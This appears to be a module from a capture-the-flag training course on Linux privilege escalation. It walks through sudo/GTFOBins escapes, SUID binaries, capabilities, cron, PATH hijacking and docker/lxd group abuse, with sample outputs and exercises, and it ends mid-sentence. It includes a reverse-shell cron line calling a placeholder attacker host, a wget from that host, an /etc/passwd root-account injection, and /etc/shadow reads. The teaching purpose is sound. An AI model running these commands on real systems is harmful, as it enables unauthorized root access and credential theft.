# 05 — Linux Privilege Escalation

Eleven of the thirteen machines in this path end with the same final question: you
have a shell as a low-privilege user, and you want `root`. This module is the
ordered method for answering it.

> There is no `docs/PRIVESC-LINUX.md` in this repo. This module **is** the
> privilege-escalation reference for the path. The closest cross-references are
> [`docs/CONCEPTS.md` §15](../docs/CONCEPTS.md#15-linux-privilege-escalation) and
> [`docs/TOOLS.md`](../docs/TOOLS.md).

---

## 0. The mental model

Privilege escalation is **not** about finding a magic exploit. It is about finding
a **confused deputy**: something running as root that will do something for you
that you are not allowed to do yourself.

> ### 📖 Concept — The confused deputy problem
> A *confused deputy* is a more-privileged program that can be tricked into using
> its privilege on your behalf. `sudo`, SUID binaries, cron jobs, services and
> container runtimes are all deputies. The bug is almost never in the deputy — it
> is in the **configuration that lets a low-privilege user control its input**.
> Every technique in this module is a way of finding a deputy whose configuration
> is wrong.

**Enumerate, then reason.** The order below is not arbitrary: it is ordered by
*hit rate on beginner boxes*, highest first. Do not jump to a kernel exploit because
it is exciting — it is the lowest-probability vector here and the one most likely
to crash the machine.

```bash
id && sudo -l && uname -a && cat /etc/os-release
```

| Check | Question it answers |
| --- | --- |
| `id` | Who am I? Which groups? (`docker`, `lxd`, `sudo`, `www-data`) |
| `sudo -l` | What may I run **as root**? ← highest-yield single command |
| `uname -a` | What kernel? Old kernels have public local-root exploits |
| `cat /etc/os-release` | What distro/version? |

**Automate it** — but read the output; scripts miss context:

```bash
wget http://ATTACKER:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee peas.txt
bash linux-smart-enumeration.sh          # or lse.sh
```

`linpeas` colour-codes a **95%+ probability** of being exploitable in red. Start
there. Serve it from your attack box with `python3 -m http.server 8000`.

---

## 1. `sudo` — the highest-yield vector

```bash
sudo -l
```

```text
Matching Defaults entries for mike on raven:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:...

User mike may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
```

Read that as a contract: user `mike` may run `/usr/bin/python` as **any user**
(`(ALL)`) **without a password** (`NOPASSWD:`). The command is fixed — but Python
is an interpreter, so the *arguments* are yours, and that is the whole attack.

```bash
sudo /usr/bin/python -c 'import os; os.system("/bin/bash")'
# id -> uid=0(root)
```

> ### 📖 Concept — Why "a fixed command" is not a restriction
> The author of that `sudoers` line believed they were granting permission to run
> *one program*. What they actually granted is permission to run **anything that
> program can be made to do**. Any interpreter (`python`, `perl`, `ruby`, `php`),
> any pager (`less`, `more`), any editor (`vi`, `vim`, `nano`), any file transfer
> tool (`scp`, `curl`, `wget`, `ftp`) and any shell-out (`find -exec`, `tar`,
> `awk`, `zip`) is an escape hatch. This is why `sudo -l` is the first thing you run.

**[GTFOBins](https://gtfobins.github.io/) is the catalogue.** Search the binary name
and it gives you the exact escape. The pattern for every entry is the same:

```bash
# a pager that can run a shell command
sudo less /etc/profile        # then type  !/bin/sh
sudo more /etc/profile        # same

# editors that can shell out
sudo vi -c ':!/bin/sh' /dev/null
sudo vim -c ':!/bin/sh'
sudo nano                     # then Ctrl-R Ctrl-X, type /bin/sh

# anything that executes a file or a command
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python3 -c 'import os; os.execl("/bin/sh","sh")'
sudo perl -e 'exec "/bin/sh";'
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo curl -o /dev/null file:///etc/shadow          # read-only disclosure, still root-equivalent info
sudo tee /etc/cron.d/x <<< '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'
```

**Machines 4, 10 and 12 are pure GTFOBins:**

| Machine | Binary | Why it works |
| --- | --- | --- |
| 4 (DC: 2) | `less`, `vi` | The `sudo` password is *known* but the user is in a restricted shell — GTFOBins escapes both |
| 10 (PwnLab: init) | `find`, `env` | A SUID chain first, then a sudo escape |
| 12 (symfonos: 1) | `curl` — **by bare name** | See §7: a relative path in `sudoers` is a PATH-hijack gift |

Also check `sudo -l` output for `(ALL:ALL)`, for `NOPASSWD:` vs a password prompt,
and for `Defaults env_keep +=` lines that preserve dangerous variables.

---

## 2. SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

> ### 📖 Concept — SUID and what `rws` means
> The **set-user-ID** bit makes a program run with the **effective UID of its
> owner**, not of whoever launched it. In `ls -l` the owner's execute position shows
> `s` instead of `x`: `-rwsr-xr-x root root /usr/bin/find`. Because the file is
> owned by `root`, anyone who runs it gets root privileges *for the duration of that
> process*. That is legitimate for `passwd` (which must write `/etc/shadow`) and
> catastrophic for anything that can be made to run a shell.

**Compare against the known-default set.** Most SUID binaries on any Linux system
are stock. The interesting one is the *extra*:

```text
/bin/su  /bin/mount  /bin/umount  /usr/bin/passwd  /usr/bin/sudo
/usr/bin/chsh  /usr/bin/chfn  /usr/bin/gpasswd  /usr/bin/newgrp
```

Anything outside that list is a lead. `find`, `vim`, `python`, `perl`, `php`,
`bash`, `env`, `nmap` (old versions), `cp`, `less`, `tail`, `curl`, `msgmike` —
all of these appear as SUID in machines in this path.

**Machine-by-machine, so you know what "normal" looks like:**

| Machine | SUID binary | Escape |
| --- | --- | --- |
| 3 (DC: 1) | `/usr/bin/find` | `find . -exec /bin/sh \; -quit` |
| 6 (bossplayersCTF) | a shell-ish binary | `bash -p` (keep privileges) |
| 10 (PwnLab: init) | `msgmike` → `msg2root` | A **two-stage chain**: `msgmike` runs `cat` by bare name (PATH hijack), `msg2root` takes stdin (inject a shell) |
| 11 (Photographer) | `php7.2` | `sudo php -r "system('/bin/bash');"` — or `-a` interactive |
| 12 (symfonos: 1) | `curl` **by bare name in sudoers** | See §7 |
| 13 (HackInOS) | `tail` | `sudo tail -n1 /etc/shadow` — disclosure, then escalate |

> **`bash -p` matters.** Many shells deliberately drop SUID privileges on start as a
> hardening measure. `bash -p` ("privileged") tells it not to. If you get a SUID
> bash and `id` still shows your old UID, that is why.

`find` is the canonical case because `-exec` is *designed* to run arbitrary
commands. Note the `-quit` — it stops after the first match so you are not spawning
shells for every directory.

---

## 3. Capabilities

Modern Linux splits root's powers into ~40 **capabilities**, and a file can be
granted individual ones without full SUID:

```bash
getcap -r / 2>/dev/null
```

```text
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/tar = cap_dac_read_search+ep
```

> ### 📖 Concept — Reading `cap_setuid+ep`
> `+ep` means the capability is in the **e**ffective and **p**ermitted sets — i.e.
> *active*. `cap_setuid` is the power to set your own UID. `cap_dac_read_search`
> bypasses **all** file *read* permission checks and directory *search* checks: it
> does not let you execute or write, but it lets you read `/root/flag.txt` and
> `/etc/shadow` regardless of their mode bits. Machine 8 is exactly this — an
> unusual, deliberately narrow grant that is trivial to exploit.

Common dangerous capabilities and what each gives you:

| Capability | Grants | Escalation |
| --- | --- | --- |
| `cap_setuid` | set your own UID | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_dac_read_search` | read/search any file | `tar xf /etc/shadow` · read `/root/*` |
| `cap_dac_override` | bypass write checks too | overwrite anything |
| `cap_sys_admin` | near-root | mount, many paths |
| `cap_chown` | change any file's owner | `chown me /etc/passwd` |

`getcap` is a *separate* check from SUID. A hardened machine may have no unusual
SUID binaries at all and still be vulnerable through capabilities. **Run both.**

---

## 4. Cron jobs

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
ls -la /var/spool/cron/crontabs/ 2>/dev/null
```

```text
* * * * * root cd /var/www/html && bash backup.sh
```

The two questions:

1. **Is the script writable by me?**
   `ls -l /var/www/html/backup.sh` → `-rwxrwxrwx` means anyone can rewrite it.
   Append a reverse shell and wait up to a minute.
2. **Is the command referenced by bare name?** Then the `PATH` matters — see §7.

Machine 9 (CengBox: 1) is exactly case 1: a world-writable script run by `root`
every minute. The fix is to make the cron line use an **absolute path** and to
restrict the script's permissions.

> **Cron has a minimum granularity of one minute** and its environment is minimal:
> no `$PATH` beyond `/usr/bin:/bin`, no shell functions, no TTY. Write cron payloads
> with absolute paths (`/bin/bash`, not `bash`) and log to a file so you can debug.

Also check for a **writable `/etc/cron.d/`** — dropping a file there with a
`* * * * * root …` line is the same attack without needing an existing job.

---

## 5. Writable files owned by root

```bash
find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -50
find /etc -writable -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null     # world-writable
```

The interesting hits:

| File | If writable, then… |
| --- | --- |
| **`/etc/passwd`** | Add your own UID-0 account (see below) |
| **`/etc/shadow`** | Replace a hash with one you know, or with an empty field |
| `/etc/sudoers` | Add `user ALL=(ALL) NOPASSWD: ALL` |
| `/etc/ld.so.preload` | Inject a shared library into **every** process → instant root |
| `/etc/crontab`, `/etc/cron.d/*` | Root-executed arbitrary code |
| `/root/.ssh/authorized_keys` | SSH in as root |
| A root-run script anywhere | Rewrite it |
| A library in `/etc/ld.so.conf.d/` | Point at your directory → hijack a root binary |

Machine 1 is built on a **world-writable `/etc/passwd`** — an almost unheard-of
misconfiguration that is nonetheless the single fastest root on any box that has it.

### The `/etc/passwd` trick

`/etc/passwd` is colon-delimited, seven fields:

```text
michael:x:1000:1000:Michael Scott,,,:/home/michael:/bin/bash
      ^
      'x' means "the password hash lives in /etc/shadow"
```

Replace the `x` with a real hash and the kernel will authenticate **from this
file**, ignoring `/etc/shadow`:

```bash
openssl passwd -1 -salt ignite superpassword        # MD5-crypt, $1$…
echo 'ignite:$1$ignite$XpO6y1nK1vB0yG0yQ3m0o/:0:0:root:/root:/bin/bash' >> /etc/passwd
su ignite                                            # -> root
```

Set **UID and GID both to `0`** — that is what makes the account root. Generate the
hash on your attack machine if `openssl` is absent on the target; never hand-type a
hash (see [module 04 §4](04-Credentials-and-Cracking.md) on quoting `$`).

> **Prefer this over writing to `/etc/shadow`** when both are writable: `passwd`
> entries are additive, so you can delete your line afterwards and leave the system
> as you found it. Editing `/etc/shadow` in place risks locking out a real account.

---

## 6. Kernel exploits

```bash
uname -r; cat /etc/os-release
searchsploit linux kernel $(uname -r)
```

| Machine | Kernel | CVE | Exploit |
| --- | --- | --- | --- |
| 2 (CyberSploit) | Ubuntu 14.04 | **CVE-2015-1328** overlayfs · **CVE-2016-5195** Dirty COW | `ofs.c`, `dirtyc0w.c` |
| 5 (Kioptrix L1) | 2.4.x | several | distro-specific |
| 8 (Empire: Breakout) | Debian 10 | — | capabilities instead |

**Try kernel exploits last.** Three reasons: they frequently **panic the VM** (you
lose your shell and your progress), they are architecture- and version-specific
(needing compilation, sometimes patching), and on a beginner box there is almost
always a simpler configuration error sitting right in front of you. When you do use
one, prefer a **precompiled** binary if available and read the source first.

`linpeas` will tell you which CVEs apply to your kernel — trust that list more than
`searchsploit`, which matches on strings.

---

## 7. `PATH` hijacking

> ### 📖 Concept — What `PATH` actually does
> `PATH` is a colon-separated list of directories. When you type `find`, the shell
> searches those directories **left to right** and runs the **first match**. It does
> not verify that the match is the intended program. So if you can place a file named
> `find` in a directory that appears earlier in `PATH` than `/usr/bin`, your file runs
> instead.

The attack requires that something privileged invokes a command **by bare name**:

```bash
# a root cron job:  cd /var/www && ./backup.sh
# inside backup.sh:  tar -czf /backups/www.tar.gz .
# 'tar' is bare -> hijackable
```

```bash
mkdir -p /tmp/x
cat > /tmp/x/tar <<'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/x/tar
export PATH=/tmp/x:$PATH        # prepend, so yours is found first
./backup.sh                     # -> root shell
```

**Machine 10 (PwnLab: init)** escalates exactly this way: the SUID binary `msgmike`
calls `cat` by bare name, so placing your own `cat` earlier in `PATH` runs it with
`msgmike`'s privileges.

**Machine 12 (symfonos: 1)** is the same bug wearing a `sudoers` disguise: the entry
reads `NOPASSWD: curl` — a *bare name*, not `/usr/bin/curl`. `sudo` honours the
user's `PATH` unless `secure_path` overrides it, so a `curl` in a directory you
control becomes a root-executed shell. Check `sudo -l` output for the `Defaults
secure_path=` line: **if it is absent, bare-name sudo entries are hijackable.**

> **Always inspect the `Defaults` block of `sudo -l`.** `secure_path` is the single
> line that decides whether this entire vector is available.

Also worth checking: `echo $PATH` for `.` or an empty entry (meaning "current
directory"), and any writable directory already in the privileged `PATH`.

---

## 8. Groups as escalation vectors

`id` output can hand you root:

| Group | Grants | Escalation |
| --- | --- | --- |
| **`docker`** | talk to the Docker daemon, which runs as root | `docker run -v /:/host --rm -it alpine chroot /host` |
| **`lxd`** | create privileged containers | `lxc init ubuntu s -c security.privileged=true; lxc config device add s x disk source=/ path=/mnt; lxc start s; lxc exec s -- /bin/sh` |
| **`sudo`** | may run sudo (with a password) | `sudo -l`, then §1 |
| **`wheel`** | same, on RHEL-family | ditto |
| **`adm`** | read `/var/log/*` | harvest credentials, tokens |
| **`disk`** | raw access to block devices | `debugfs /dev/sda1` → read anything |
| **`shadow`** | read `/etc/shadow` | offline cracking |
| **`www-data`** | web server identity | read web configs, DB creds |
| **`video`** | framebuffer | read the screen |

Machine 9 (CengBox: 1) is an **`lxd`** escape. Machine 13 (HackInOS) is a **Docker
container escape** — see [module 06 §6](06-Shells-Persistence-and-Escapes.md) for
the mechanics of getting out of a container.

> ### 📖 Concept — Why `docker` and `lxd` membership is root
> Both daemons run as root and let a member create a process whose filesystem view
> they choose. Mounting the host's `/` into a container you control gives you a root
> shell on the host with no exploit, no CVE and no vulnerability in the software —
> only in the *group membership*. This is why "who is in the docker group" is a
> standard audit question.

---

## 9. The ordered checklist

Work top to bottom. Stop when you have root.

```text
[ ] 1. id; sudo -l              <- is there a GTFOBins entry?
[ ] 2. getcap -r / 2>/dev/null  <- unusual capabilities?
[ ] 3. find / -perm -4000 -type f 2>/dev/null  <- SUID outside the stock set?
[ ] 4. cat /etc/crontab; ls -la /etc/cron.d/   <- root cron, writable or bare-name?
[ ] 5. ls -l /etc/passwd /etc/shadow /etc/sudoers /etc/ld.so.preload  <- writable?
[ ] 6. find /etc -writable -type f 2>/dev/null
[ ] 7. echo $PATH; grep -rn 'Defaults secure_path' <- bare names anywhere?
[ ] 8. Reuse every credential you hold, everywhere
[ ] 9. Look for a root-executed script/service that reads YOUR file or directory
[ ]10. Kernel: uname -r, then linpeas's CVE list
```

Run `linpeas.sh` at any point to shortcut the search — but read the output rather
than piping it into your head. The value of doing this manually on these thirteen
machines is that you learn *what* to look for, which is the part no script teaches.

---

## 10. Exercises

1. **Create a SUID escalation on your own Kali.** As root, `cp /bin/find
   /usr/local/bin/find && chmod u+s /usr/local/bin/find`. Log in as a normal user
   and escalate. Then remove the SUID bit and confirm you cannot.
2. **Build a PATH hijack end to end.** Write a script that calls `tar` by bare name,
   make it root-owned and run it from cron. Hijack it as a normal user. Then fix it
   by using an absolute path and confirm the hijack fails.
3. **Test `cap_dac_read_search`.** As root, `setcap cap_dac_read_search+ep
   /usr/bin/tar`. As a normal user, use `tar` to read `/etc/shadow`. Remove the
   capability and confirm access is gone.
4. **Do the `/etc/passwd` trick in a throwaway VM** and then undo it. Verify `su`
   worked and that the account had UID 0.
5. **Enumerate without a script.** On any machine you have already rooted, run the
   ten-step checklist manually and record which step would have found it. Did you
   get it in the first three?

---

## 11. Check yourself

1. What is a confused deputy, and why is `sudo` the classic example?
2. `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/less`. Write the escalation.
3. What does the `s` in `-rwsr-xr-x` mean, and what does the file's *owner* have to
   do with what you gain?
4. Why do you need `bash -p` when exploiting a SUID bash?
5. What does `cap_dac_read_search` let you do that ordinary file permissions would
   forbid?
6. A root cron job runs `bash /opt/backup.sh`, and `ls -l` shows `-rwxrwxrwx`. What
   do you do?
7. What line in `sudo -l` output decides whether a bare-name sudo entry is
   hijackable?
8. Name three groups that are effectively root, and say why.
9. Why is a kernel exploit the *last* thing you try on a beginner box?
10. You find `/etc/passwd` writable. Which two numeric fields must you set to make
    your new account root?

---

## 12. Annotated command reference — every input, every output

Each command below is shown with its **inputs explained token by token**, **real
output**, and a **line-by-line reading**. Run them in this order on every box.

---

### 12.1 Orientation — the first four commands

```bash
id
sudo -l
uname -a
cat /etc/os-release
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```text
Matching Defaults entries for mike on raven:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mike may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
```
```text
Linux raven 3.16.0-6-amd64 #1 SMP Debian 3.16.56-1 (2018-04-14) x86_64 GNU/Linux
```
```text
PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
NAME="Debian GNU/Linux"
VERSION_ID="8"
VERSION="8 (jessie)"
ID=debian
HOME_URL="http://www.debian.org/"
```

**`id` output, decoded.** `uid=33(www-data)` — your **real** UID: who you are.
`gid=33(www-data)` — your primary group. `groups=33(www-data)` — *every* group you
belong to. UID `33` is Debian/Ubuntu's Apache worker account; UID `0` is root by
definition; UIDs `1000+` are ordinary users; UIDs `1–999` are system/service accounts.
**The `groups=` list is where escalation hides** — look for `docker`, `lxd`, `sudo`,
`wheel`, `adm`, `disk`, `shadow`, `video`. Later, after a SUID exploit, this same command
shows `uid=33(www-data) gid=33(www-data) euid=0(root)` — and that **`euid`** (effective
UID) is what the kernel consults when deciding whether you may open a file.

**`sudo -l` output, decoded — read it as a contract.**

| Line | Meaning |
| --- | --- |
| `Matching Defaults entries for mike on raven:` | the policy defaults that apply to this user |
| `env_reset` | sudo **clears the environment** before running the command. Most variables you set will not survive — which is why `LD_PRELOAD` tricks usually fail |
| `mail_badpass` | mail the administrator when a wrong password is entered. **Your attempts are logged and reported** |
| **`secure_path=/usr/local/sbin:…:/bin`** | sudo **overrides `PATH`** with this fixed list. If this line is present, `PATH` hijacking against a sudo command **cannot work**. If it is *absent*, it can — and that is exactly Machine 12's bug |
| `(ALL) NOPASSWD: /usr/bin/python` | the grant, in three parts: **`(ALL)`** = you may run it as any user (and with `(ALL:ALL)` any group too); **`NOPASSWD:`** = no password will be requested; **`/usr/bin/python`** = the exact permitted program |

The critical insight: the *command* is fixed, but **its arguments are yours**. Anything
that is an interpreter, a pager, an editor, a file-transfer tool or can shell out is an
escape hatch. Look it up on [GTFOBins](https://gtfobins.github.io/).

Also watch for `(ALL) ALL` (everything, with a password — then the question becomes *whose
password*, and password reuse is the answer), for a `User_Alias`/`Cmnd_Alias` you did not
expect, and for `sudo: unable to resolve host <name>` (a harmless but common warning on
CTF boxes whose `/etc/hosts` is incomplete — it does **not** mean sudo failed).

**`uname -a`, field by field.** `Linux` (kernel family) · `raven` (hostname — often
different from what DNS said) · `3.16.0-6-amd64` (**kernel release: the string you feed
to `searchsploit`**; `-amd64` is the architecture) · `#1 SMP Debian 3.16.56-1
(2018-04-14)` (build number, `SMP` = symmetric multiprocessing enabled, distribution and
build date) · `x86_64` (machine hardware) · `GNU/Linux`. **The build date tells you how
long the box went unpatched**, which is often the real finding.

**`/etc/os-release`** gives the human-readable distribution — `Debian GNU/Linux 8
(jessie)`, end-of-life since 2020. `ID=debian` and `VERSION_ID="8"` are the
machine-parsable fields. Distro *and* kernel together determine which exploits apply: an
Ubuntu 14.04 overlayfs exploit will not work on Debian 8, even with a similar kernel.

---

### 12.2 `sudo` escapes — the shapes you must recognise

```bash
sudo /usr/bin/python -c 'import os; os.system("/bin/bash")'
sudo less /etc/profile        # then type:  !/bin/sh
sudo vi -c ':!/bin/sh' /dev/null
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo curl -o /dev/null file:///etc/shadow
id
```

```text
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Each of these works by a different mechanism — knowing which is the point:**

| Binary | Mechanism | What the input does |
| --- | --- | --- |
| `python -c` | **interpreter** | `-c` executes a program string; `os.system()` invokes a shell. sudo granted "run python"; python can run anything |
| `less` / `more` | **pager shell command** | `!CMD` inside a pager runs `CMD` via the shell. `less` also has `v` (open `$EDITOR`) and `s` |
| `vi` / `vim` | **editor shell-out** | `-c ':!/bin/sh'` runs an Ex command at startup; `:` then `!` shells out. Equivalent: `:set shell=/bin/sh` then `:shell` |
| `nano` | **file-insert** | `Ctrl-R Ctrl-X` runs a command whose output is inserted — type `/bin/sh` and it executes |
| `find` | **`-exec`** | `-exec CMD \;` runs `CMD` per match; `\;` terminates it (escaped so your shell does not eat it); `-quit` stops after the first match so you get one shell, not one per directory |
| `awk` | **BEGIN block** | `BEGIN{…}` runs before any input; `system()` shells out |
| `tar` | **checkpoint action** | `--checkpoint=1` fires after every record; `--checkpoint-action=exec=CMD` runs `CMD`. `cf /dev/null /dev/null` makes tar do nothing else |
| `curl file://` | **file read as root** | not a shell, but it discloses `/etc/shadow` — which is a root-equivalent *information* win. `curl` can also `POST` to `file://` and `-o` to write, so it can overwrite files too |

**The `\;` question everyone asks.** In `find . -exec /bin/sh \;` the `;` ends the
`-exec` clause, but `;` is also *your shell's* command separator. `\;` escapes it so
`find` receives a literal semicolon. Forgetting the backslash gives
`find: missing argument to '-exec'`.

**Verify with `id`, not `whoami`.** `whoami` prints the *effective* user and can mislead;
`id` shows real, effective and saved UIDs plus groups, so you can see exactly what changed
— and whether you gained root authority without changing identity.

---

### 12.3 SUID hunting

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
ls -l /usr/bin/find /usr/bin/php7.2 /usr/bin/tail
strings /home/kane/msgmike
```

```text
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/find
/usr/bin/php7.2
/usr/bin/tail
```
```text
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 /home/kane/msgmike
-rwsr-xr-x 1 root root 4012 Mar  9  2019 /usr/bin/tail
-rwxr-xr-x 1 root root 105272 Feb 12  2019 /usr/bin/find
```
```text
/lib64/ld-linux-x86-64.so.2
libc.so.6
__libc_start_main
system
cat /home/mike/msg.txt
```

**`find` arguments, decoded**

| Token | Meaning |
| --- | --- |
| `/` | start at the filesystem root — search everything |
| `-perm -4000` | files whose permission bits **include all of** `4000` (octal for the SUID bit). The leading `-` means "at least these bits", so `-rwsr-xr-x` matches |
| `-perm -u=s` | the symbolic spelling of the same test — often clearer |
| `-perm /6000` | SUID **or** SGID (2000 is the SGID bit) |
| `-type f` | regular files only — skip directories and sockets |
| `2>/dev/null` | discard **stderr**. `find` cannot enter `/proc/…` and dozens of other paths and prints a `Permission denied` for each; that noise would bury the results. `2>` means "redirect file descriptor 2" |

**`ls -l` permission string, position by position**

```text
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 /home/kane/msgmike
││││││││││ │  │    │    │    │            │
││││││││││ │  │    │    │    │            └─ name
││││││││││ │  │    │    │    └─ size / date
││││││││││ │  │    │    └─ group owner
││││││││││ │  │    └─ user owner  <-- THIS decides whose privileges you gain
││││││││││ │  └─ link count
││││││││││ └─ file type: '-' file, 'd' directory, 'l' symlink, 's' socket
│││││││││└─ other: execute
││││││││└─ other: write
│││││││└─ other: read
││││││└─ group: execute (here 'x'; 's' would mean SGID is set)
│││││└─ group: write
││││└─ group: read
│││└─ user: execute — 's' means SUID is set AND execute is allowed; 'S' (capital) means SUID set but NOT executable, which is a broken, inert configuration
││└─ user: write
│└─ user: read
```

So `-rwsr-sr-x 1 mike mike` means: **owned by `mike`, SUID *and* SGID both set, and
executable by everyone.** Anyone running it becomes `mike` for that process — which is
exactly how Machine 10's first escalation stage works.

**The stock SUID set on any Linux box** is roughly:
`su`, `sudo`, `passwd`, `mount`, `umount`, `chsh`, `chfn`, `gpasswd`, `newgrp`, and on
some systems `pkexec`, `fusermount`, `vmware-user-suid-wrapper`. **Anything else in your
`find` output is a lead.** `find`, `vim`, `python`, `perl`, `php`, `bash`, `env`, `cp`,
`less`, `tail`, `curl`, `nmap`, `tar` — every one of these appears as SUID somewhere in
this path, and none of them should ever be.

**Why `bash -p`?** Most shells deliberately **drop** SUID privileges at startup as a
hardening measure, so `bash` from a SUID bash gives you your own UID. `-p` ("privileged")
tells it not to drop them. If your SUID shell shows `uid=1000` instead of `uid=0`, that
is why — and `-p` is the fix.

**`strings` on a binary.** `strings -n 6 FILE` prints every run of ≥6 printable
characters. On a compiled program this surfaces its literals: file paths, format strings,
error messages, and — crucially — **the commands it invokes**. `cat /home/mike/msg.txt`
appearing in `msgmike`'s strings tells you instantly that the program calls `cat` **by
bare name**, which is the PATH-hijack opening. Always run `strings` on any unusual SUID
binary before trying anything clever; `file FILE` alongside it tells you whether it is
ELF, a script (in which case just `cat` it), and whether it is `not stripped`.

---

### 12.4 Capabilities

```bash
getcap -r / 2>/dev/null
```

```text
/home/cyber/tar = cap_dac_read_search+ep
/usr/bin/python3.8 = cap_setuid+ep
```

| Token | Meaning |
| --- | --- |
| `getcap` | list file capabilities |
| `-r` | recurse into subdirectories |
| `/` | start at the root — search the whole filesystem |

**Reading `= cap_dac_read_search+ep`:** the `+` assigns, `e` puts it in the **effective**
set (active immediately, no extra step needed), `p` puts it in the **permitted** set. A
capability in only `p` and not `e` is present but dormant. `cap_dac_read_search` bypasses
**all file-read permission checks and all directory-search checks** — so `tar` with this
capability can read `/root/anything` and `/etc/shadow` regardless of mode bits. It cannot
write and cannot execute, and it is still fatal, because one readable file contained a
root password (Machine 8).

**Why capabilities exist.** Root's power is a single all-or-nothing bit. Capabilities
split it into ~40 discrete privileges so a program can be granted *exactly* what it needs
— `ping` needs only `cap_net_raw`, not full root. The security failure is granting a broad
one to a user-reachable binary.

| Capability | Grants | Escalation |
| --- | --- | --- |
| `cap_setuid` | change your own UID | `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
| `cap_dac_read_search` | read/search any file | `tar xf /etc/shadow`, read `/root/*` |
| `cap_dac_override` | bypass **write** checks too | overwrite anything |
| `cap_sys_admin` | mount, and dozens of paths | near-root |
| `cap_chown` | change any file's owner | `chown me /etc/passwd` then write it |
| `cap_net_raw` | craft raw packets | sniffing, spoofing |
| `cap_sys_ptrace` | inject into other processes | read/write another process's memory |

**`getcap` is a separate check from SUID and you must run both.** A hardened machine may
have a perfectly ordinary SUID set and still be trivially escalatable through a
capability — which is precisely Machine 8. Most beginners check SUID, find nothing, and
stop.

```bash
/home/cyber/tar -cvf /tmp/leak.tar /var/backups/.old_pass.bak
cd /tmp && /home/cyber/tar -xvf leak.tar
ls -l /tmp/var/backups/.old_pass.bak
cat /tmp/var/backups/.old_pass.bak
```

```text
/home/cyber/tar: Removing leading `/' from member names
var/backups/.old_pass.bak
/tmp/leak.tar
ls -l output:
-rw------- 1 cyber cyber 20 Oct 21  2021 /tmp/var/backups/.old_pass.bak
Ts&4&YurgtRX(=~h
```

Three things to read here. **(1)** `Removing leading '/' from member names` — tar strips
the leading slash on archiving so that extraction cannot overwrite absolute paths. That
warning is why your extracted copy lands at `/tmp/var/backups/…` and not at
`/var/backups/…`. **(2)** The archive step needed no read permission check because the
capability bypassed it — `cat /var/backups/.old_pass.bak` directly would have said
`Permission denied`. **(3)** **The extracted file is owned by `cyber`.** Extraction runs
as you, and without `--same-owner` (which requires root anyway) tar creates files owned
by the extracting user. So the copy is yours to read: the DAC bypass turned a read
restriction into an ownership change. That two-step — *archive as root-read, extract as
me* — is the whole technique.

---

### 12.5 Cron

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
ls -la /var/spool/cron/crontabs/ 2>/dev/null
crontab -l
ls -l /opt/md5check.py /opt/statuscheck
./pspy64 -pf
```

```text
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /opt/md5check.py
```
```text
-rwxrwxrwx 1 root root 1024 Apr 30  2020 /opt/md5check.py
```
```text
pspy - version: v1.2.1 - Commit ID: 1739b25

2024/05/11 14:02:11 CMD: UID=0     PID=2841   | /bin/sh -c /opt/md5check.py
2024/05/11 14:02:11 CMD: UID=0     PID=2842   | /usr/bin/python /opt/md5check.py
2024/05/11 14:02:16 CMD: UID=0     PID=2851   | /bin/sh -c /opt/md5check.py
2024/05/11 14:02:16 CMD: UID=0     PID=2852   | /usr/bin/python /opt/md5check.py
```

**`/etc/crontab` fields:** `m h dom mon dow user command` — minute, hour, day-of-month,
month, day-of-week, **the user to run as**, then the command. `*` means "every". So
`* * * * * root /opt/md5check.py` is *every minute, as root*. Note that `/etc/crontab`
has a **user column** that a personal crontab (`crontab -e`) does not — personal crontabs
always run as their owner.

The environment lines at the top are load-bearing: **`PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`**
is the path a cron command inherits, and **`SHELL=/bin/sh`** is the shell used. A cron job
calling `tar` by bare name resolves against *that* PATH, not yours.

`run-parts --report /etc/cron.hourly` is how Debian runs every executable file in a
directory — so **dropping a file into a writable `/etc/cron.d/` or `/etc/cron.daily/` is
an escalation in itself**, without any pre-existing job.

**`ls -l /opt/md5check.py` → `-rwxrwxrwx 1 root root`.** Mode **777**: owner, group *and
